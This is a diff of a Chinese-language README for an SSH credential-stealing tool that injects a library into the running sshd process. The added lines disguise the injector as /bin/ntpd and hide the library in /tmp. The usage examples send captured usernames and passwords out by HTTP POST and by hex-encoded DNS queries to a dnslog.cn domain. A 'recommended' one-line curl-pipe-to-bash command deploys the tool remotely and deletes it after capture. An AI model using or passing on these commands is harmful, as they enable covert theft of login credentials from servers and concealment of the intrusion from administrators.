@@ -22,8 +22,9 @@ bash install.sh or bash install_aarch64.sh
 
 其他参数：
 ```
-    -e   修改so文件的路径，默认/tmp/hello.so
-    -o   修改注入器的路径，默认/tmp/.i.
+    -s   设置要注入的sshd的进程pid，一般会默认获取，如果获取不到或者自动获取错误了再使用这个参数
+    -e   修改so文件的路径，默认/tmp/.g.so
+    -o   修改注入器的路径，默认/bin/ntpd
     -m   修改mode默认值为0，输出到文件，默认记录地址为/tmp/.password.txt ，如果值为1，则会改为命令行模式
     -p   修改payload，默认值为/tmp/.password.txt，如果mode值为1，则会使用snsprintf来格式化命令并且输出，请确保字符串中包含两个%s，用于格式化用户名和密码
     -d   自动删除，设置为anyone则抓到密码后立刻删除，否则则抓取到设置的指定用户名后删除
@@ -31,19 +32,24 @@ bash install.sh or bash install_aarch64.sh
 ```
 ## 例子
 
-https发送密码
+http发送密码
 ```
-bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
+bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1
 ```
 
-dns发送密码并且自动删除（请确保你的命令是不堵塞的，因为本程序的实现用的是system是当线程，命令如果堵塞将会导致ssh登录线程一并堵塞）
+dns发送密码并且自动删除（请确保你的命令是不堵塞的，因为本程序的实现用的是system是单线程，命令如果堵塞将会导致ssh登录线程一并堵塞）
 ```
 bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
 ```
 
 远程快速自动部署并自动删除
 ```
-curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.2/sshdHooker.sh | bash -s -- -d anyone
+curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -d anyone
+```
+
+远程快速自动部署并通过http发送密码后并自动删除 (*推荐*)
+```
+curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -p "curl -X POST -d 'username=%s\&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1 -d anyone
 ```
 
 ## debug
